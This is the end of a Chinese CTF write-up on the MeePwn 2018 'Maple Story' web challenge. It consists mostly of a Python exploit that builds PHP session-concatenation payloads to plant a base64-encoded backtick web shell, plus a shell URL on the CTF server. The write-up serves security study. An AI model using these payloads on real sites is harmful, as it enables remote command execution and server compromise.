</span></span><span style=display:flex><span>    _role<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054&#39;</span>,
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do</span>(s):
</span></span><span style=display:flex><span>    change_name(s)
</span></span><span style=display:flex><span>    give_pet(user_email)
</span></span><span style=display:flex><span>    print s
</span></span><span style=display:flex><span>    print shell()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?=$_SESSION[a]=&#39;*/&#39;?&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?=$_SESSION[a].=&#39;;&#39;?&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?=$_SESSION[a].=&#39;&#34;&#39;?&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?=$_SESSION[a].=&#39;&lt;&#39;?&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?=$_SESSION[a].=&#39;?&#39;/*
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?=$_SESSION[a].=&#39;=&#39;/*
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?=$_SESSION[a].=&#39; &#39;/*
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;`echo PD89YCRfR0VUWzFdYDsK|base64 -d &gt;&gt; upload/</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>/command.txt`&#39;</span> <span style=color:#f92672>%</span> hashlib<span style=color:#f92672>.</span>md5(
</span></span><span style=display:flex><span>    salt <span style=color:#f92672>+</span> user_email)<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>payload3 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?=$_SESSION[a].=&#39;&#39;/*
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?=$_SESSION[a].=&#39;?&#39;/*
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?=$_SESSION[a].=&#39;&gt;&#39;/*
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?=$_SESSION[a]?&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>xxx</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> p <span style=color:#f92672>in</span> payload1<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)[<span style=color:#ae81ff>1</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]:
</span></span><span style=display:flex><span>        do(p)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> payload2:
</span></span><span style=display:flex><span>        p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&lt;?=$_SESSION[a].=&#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;/*&#34;</span> <span style=color:#f92672>%</span> c
</span></span><span style=display:flex><span>        do(p)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> p <span style=color:#f92672>in</span> payload3<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)[<span style=color:#ae81ff>1</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]:
</span></span><span style=display:flex><span>        do(p)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>xxx()
</span></span><span style=display:flex><span>print hashlib<span style=color:#f92672>.</span>md5(salt <span style=color:#f92672>+</span> user_email)<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span><span style=color:#75715e># 可通过运行结果理解payload的巧妙</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 结果存放在</span>
</span></span><span style=display:flex><span><span style=color:#75715e># https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/maplStory_SESSION_CONCAT_result.txt</span>
</span></span><span style=display:flex><span><span style=color:#75715e># shell at </span>
</span></span><span style=display:flex><span><span style=color:#75715e># http://178.128.87.16/?page=upload/e500ec6d3d2b69fda8ff11b5b53b5ee2/command.txt&amp;1=ls</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=88383ae2aa1f8f769.png alt></p><h1 id=参考链接>参考链接<a hidden class=anchor aria-hidden=true href=#参考链接>#</a></h1><p><a href=https://ctftime.org/writeup/10418>https://ctftime.org/writeup/10418</a></p><p><a href=https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html>MeePwn CTF 2018 Qual - Maple Story</a></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/180727penetrationtool/><span class=title>« Prev</span><br><span>【译】渗透测试工具备忘录</span></a>
<a class=next href=https://ret2neo.cn/post/180719meepwn_py3inject/><span class=title>Next »</span><br><span>Meepwn2018：PyCalx&amp;PyCalx2——Python3的f-string与eval注入</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>